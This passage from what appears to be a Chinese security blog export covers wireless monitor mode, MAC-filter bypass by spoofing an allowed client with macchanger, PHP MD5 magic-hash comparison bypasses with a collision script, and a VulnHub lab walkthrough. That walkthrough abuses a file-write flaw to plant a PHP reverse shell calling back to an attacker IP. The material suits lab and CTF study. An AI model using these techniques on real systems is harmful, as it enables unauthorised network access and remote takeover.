class="line">         * mesh point</span><br><span class="line">……………………</span><br></pre></td></tr></table></figure>
<h3 id="信道频率">2、信道频率</h3>
<ul>
<li><strong>iwlist wlan0 frequency</strong></li>
<li><strong>iw list</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320172339776-1018285323.png" /></p>
<h3 id="扫描附近ap">3、扫描附近AP</h3>
<ul>
<li><strong>iw dev wlan0 scan</strong></li>
<li><strong>iw dev wlan0 scan | grep SSID</strong></li>
<li><strong>iw dev wlan0 scan | egrep "DS Parameter set |
SSID"</strong></li>
<li><strong>iwlist wlan0 scanning | egrep "ESSID |
Channel"</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320172805991-780500287.png" /></p>
<p><strong>说明：</strong> 上图1处的 signal 指的是接收功率，AP
发射的无线电波在传播是会有较大损耗，导致接受到的功率小于
1mW，再结合db和mW的转换公式可知，dB是负的，signal &gt; -50dBm
信号还是比较强的，传输基本没啥问题。</p>
<h3 id="添加删除侦听端口">4、添加删除侦听端口</h3>
<ul>
<li><strong>iw dev wlan0 interface add wlan0mon type
monitor（注意命名限制：wlan+数字+mon）</strong></li>
<li><strong>tcpdump -S 0 -i wlan2mon
-P(建议用wireshark抓包查看)</strong></li>
<li><strong>iw dev wlan0mon interface del</strong></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># iwconfig </span></span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:off</span><br><span class="line">          </span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">root@kali:~ <span class="comment"># iw dev wlan0 interface add wlan0mon type monitor</span></span><br><span class="line">root@kali:~<span class="comment"># iwconfig </span></span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:off</span><br><span class="line">          </span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0mon  IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br><span class="line">          </span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># ifconfig </span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.10.10.181  netmask 255.255.255.0  broadcast 10.10.10.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe95:c833  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:0c:29:95:c8:33  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 10  bytes 1888 (1.8 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 48  bytes 4684 (4.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 20  bytes 1116 (1.0 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 20  bytes 1116 (1.0 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        ether 46:04:18:cb:ab:ba  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0 root@kali: ~<span class="comment"># ifconfig wlan0mon up</span></span><br><span class="line">root@kali:~<span class="comment"># ifconfig </span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.10.10.181  netmask 255.255.255.0  broadcast 10.10.10.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe95:c833  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:0c:29:95:c8:33  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 10  bytes 1888 (1.8 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 48  bytes 4684 (4.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 20  bytes 1116 (1.0 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 20  bytes 1116 (1.0 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        ether 46:04:18:cb:ab:ba  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0 wlan0mon: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        unspec 1C-BF-CE-3B-5F-BE-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)</span><br><span class="line">        RX packets 1551  bytes 76677 (74.8 KiB)</span><br><span class="line">        RX errors 0  dropped 1551  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p><strong>wireshark 抓包结果</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320174022310-2036562551.png" /></p>
<p><strong>注意：</strong> 如果" iw dev wlan0 interface add wlan0mon
type monitor "命令执行完 wlan0mon 是 Managed 模式或" ifconfig wlan0mon
up"报错（参见下图），则可能是 network-manager 对 iw
命令相冲突，可通过先执行" service network-manager
stop"命令，再进行如上操作解决。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320174845230-90161314.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320174908610-1242991525.png" /></p>
<h3 id="协议栈-1">5、协议栈</h3>
<p>参见：https://www.kernel.org/doc/htmldocs/80211/index.html</p>
<h3 id="无线驱动">6、无线驱动</h3>
<p>参见：http://liuxwireless.org/en/users/Drivers/</p>
<p>加载中…………</p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>MAC 地址绑定攻击</title>
    <url>/2022/04/18/MAC%20%E5%9C%B0%E5%9D%80%E7%BB%91%E5%AE%9A%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="mac绑定">1. MAC绑定</h2>
<p>管理员误以为MAC绑定是一种安全机制</p>
<p>限制可以关联的客户端MAC地址</p>
<p>准备AP</p>
<ul>
<li>AP基本配置</li>
<li>开启无线过滤</li>
</ul>
<p>修改MAC地址绕过过滤</p>
<h2 id="演示">2. 演示</h2>
<h3 id="路由器限制">1、路由器限制</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220418172243716-1747133454.png" /></p>
<h3 id="网卡修改mac并接入wifi">2、网卡修改MAC并接入WiFi</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># iwconfig       </span></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:off</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># ifconfig wlan0 down                                                               1 ⨯</span></span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># macchanger -m 7A:56:70:E8:D4:3E  wlan0　　　　　　#7A: ……:3E 地址的获取，可通过 airodump-ng wlan0mon 侦听推测允许连接的 MAC 地址</span></span><br><span class="line">Current MAC:   1c:bf:ce:3b:5f:be (unknown)</span><br><span class="line">Permanent MAC: 1c:bf:ce:3b:5f:be (unknown)</span><br><span class="line">New MAC:       7a:56 :70:e8:d4:3e (unknown)</span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># ifconfig wlan0 up                                                                                                            </span></span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># ifconfig         </span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.10.10.135  netmask 255.255.255.0  broadcast 10.10.10.255</span><br><span class="line">        inet6 fe80::20c:29ff:fee1:6677  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:0c:29:e1:66:77  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 14  bytes 2778 (2.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 71  bytes 6768 (6.6 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 8  bytes 400 (400.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 8  bytes 400 (400.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500 inet 192.168.0.105  netmask 255.255.255.0  broadcast 192.168.0.255</span><br><span class="line">        inet6 fe80::68eb:d6e0:4201:e552  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 7a:56:70:e8:d4:3e  txqueuelen 1000(Ethernet)     <span class="comment">#注意MAC地址，由于当前与AP相连的设备有两个MAC相同的STA，所以在AP传信息给STA时会有丢包的情况（发给另一个相同MAC的STA了）</span></span><br><span class="line">        RX packets 165  bytes 28960 (28.2 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 81  bytes 10301 (10.0 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># ping www.baidu.com</span></span><br><span class="line">PING www.a.shifen.com (36.152.44.96) 56(84) bytes of data.</span><br><span class="line">64 bytes from 36.152.44.96 (36.152.44.96): icmp_seq=1 ttl=128 time=4.06 ms</span><br><span class="line">64 bytes from 36.152.44.96 (36.152.44.96): icmp_seq=2 ttl=128 time=5.52 ms</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>MD5绕过相关</title>
    <url>/2021/08/16/MD5%E7%BB%95%E8%BF%87%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<p><strong>1.
<code>if($a != $b &amp;&amp; md5($a) == md5($b))</code></strong></p>
<ul>
<li>数组绕过法：如：?a[]=1&amp;b[]=2</li>
<li>直接传入参数a=s1885207154a，b=s1836677006a，即可，为什么呢？看一下这两个字符串的md5值可以返现分别如下：</li>
<li>MD5值：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">md5(<span class="string">&quot;s1885207154a&quot;</span>) =&gt; 0e509367213418206700842008763514</span><br><span class="line">md5(<span class="string">&quot;s1836677006a&quot;</span>) =&gt; 0e481036490867661113260034900752</span><br></pre></td></tr></table></figure>
<p>由于二者都是0e开头，
<strong>在php中0e会被当做科学计数法，就算后面有字母，其结果也是0</strong>
，所以上面的if判断结果使true，成功绕过！</p>
<p><strong>2.</strong>
<code>if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2']))</code></p>
<p>由于php的md5函数处理数组时直接返回null，将param1，param2设为数组即可，如：?param1[]=1&amp;param2[]=2</p>
<p><strong>3. 双MD5碰撞绕过
<code>if ($a != $b &amp;&amp; md5($a) == md5(md5($b))</code></strong></p>
<p>由 1
知双面的判断出现了md5(md5($b)，有了前面的铺垫，这里我们第一感觉就是找到一个字符串其MD5值的MD5仍然是0e开头的那就好了。</p>
<p><strong>双md5结果仍为0e开头字符串：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line"> </span><br><span class="line">md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line"> </span><br><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af</span><br><span class="line"> </span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line"> </span><br><span class="line">md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625</span><br><span class="line"> </span><br><span class="line">md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064</span><br><span class="line"> </span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br><span class="line"> </span><br><span class="line">md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849</span><br><span class="line"> </span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></figure>
<p><strong>MD5碰撞脚本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.letters + string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len,. start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5 = hashlib.md5(rnds)</span><br><span class="line">        value = md5.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value[start: start+str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span> rnds</span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            #碰撞双md5</span></span><br><span class="line"><span class="string">            md5 = hashlib.md5(value)</span></span><br><span class="line"><span class="string">            if md5.hexdigest()[start: start+str_len] == substr:</span></span><br><span class="line"><span class="string">                print rnds+ &quot;=&gt;&quot; + value+&quot;=&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;</span></span><br><span class="line"><span class="string">                stop_event.set()</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>
<p>上面脚本注释部分是双MD5碰撞，取消注释然后注释掉16行即可。</p>
<p>使用方法：python md5Crack.py "你要碰撞的字符串" 字符串的起始位置</p>
<p>例如：python md5Crack.py "0e" 0</p>
<p>将产生MD5值为0e开头的字符串。</p>
<p><strong>转载于：</strong></p>
<ul>
<li>https://www.cnblogs.com/zaqzzz/p/10029887.html</li>
<li>原作者：KTWO <em>出处：<a href="https://www.k2zone.cn/?p=2019"
class="uri">https://www.k2zone.cn/?p=2019</a></em></li>
</ul>
]]></content>
      <categories>
        <category>密码破解</category>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Matrix-Breakout: 2 Morpheus</title>
    <url>/2024/04/13/Matrix-Breakout%202%20Morpheus/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">Matrix-Breakout:
2 Morpheus ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts      </span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240             </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.  </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      1      60  VMware, Inc.         </span><br><span class="line">192.168.159.148 00:0c:29:a0:a4:2c      1      60  VMware, Inc.    </span><br><span class="line">192.168.159.254 00:50:56:f6:f9:f3      1      60  VMware, Inc. </span><br></pre></td></tr></table></figure>
<p>靶机 IP：192.168.159.148</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-12 22:48 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.148</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.51 ((Debian))</span><br><span class="line">|_http-title: Morpheus:1</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Debian)</span><br><span class="line">81/tcp open  http    nginx 1.18.0</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=Meeting Place</span><br><span class="line">|_http-title: 401 Authorization Required</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">MAC Address: 00:0C:29:A0:A4:2C (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   2.41 ms 192.168.159.148</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.65 seconds</span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 没注意到有价值信息，81 需要登录</p>
<p>80 主页的 trinity.jpeg 图片没找到隐写信息</p>
<p>扫下 80 目录</p>
<p>默认字典扫到个 /robots.txt</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">There&#x27;s <span class="keyword">no</span> white rabbit here.  <span class="keyword">Keep</span> searching!</span><br></pre></td></tr></table></figure>
<p>没价值……</p>
<p>81 也没扫到啥……换字典，加后缀</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.159.148/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,json -f</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Target: http://192.168.159.148/</span><br><span class="line"></span><br><span class="line">[23:20:34] Starting: </span><br><span class="line">[23:20:35] 403 -  280B  - /icons/                                          </span><br><span class="line">[23:20:52] 403 -  280B  - /javascript/                                     </span><br><span class="line">[23:20:52] 301 -  323B  - /javascript  -&gt;  http://192.168.159.148/javascript/</span><br><span class="line">[23:21:03] 200 -   47B  - /robots.txt                                      </span><br><span class="line">[23:25:13] 200 -  139B  - /graffiti.txt                                     </span><br><span class="line">[23:25:13] 200 -  451B  - /graffiti.php                                     </span><br><span class="line">[23:54:28] 403 -  280B  - /server-status </span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
<p>访问 /graffiti.php 和 /graffiti.txt 发现前者读取了后者</p>
<p>经测试 Post 的 Message 会写入 graffiti.txt</p>
<p>源码发现隐藏信息， POST 提交 Message 时会指定 file : graffiti.txt</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">Enter message: </span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">value</span>=<span class="string">&quot;graffiti.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Post<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用 bp 换个文件试试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131718173.png" /></p>
<p>graffiti.php 也可以读写，可见 graffiti.php 内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="string">&quot;graffiti.txt&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;  </span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;  </span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Cannot open file: &#x27;</span> . <span class="variable">$file</span>);  </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);  </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="string">&quot;\n&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Display file  </span></span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>,<span class="string">&quot;r&quot;</span>);  </span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$handle</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$handle</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;  </span></span><br><span class="line"><span class="string">\n&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>直接往 graffiti.php 写个反弹 shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">echo</span> shell_working; </span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&#x27;php -r \&#x27;$sock=fsockopen(&quot;192.168.159.152&quot;,&quot;4444&quot;);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
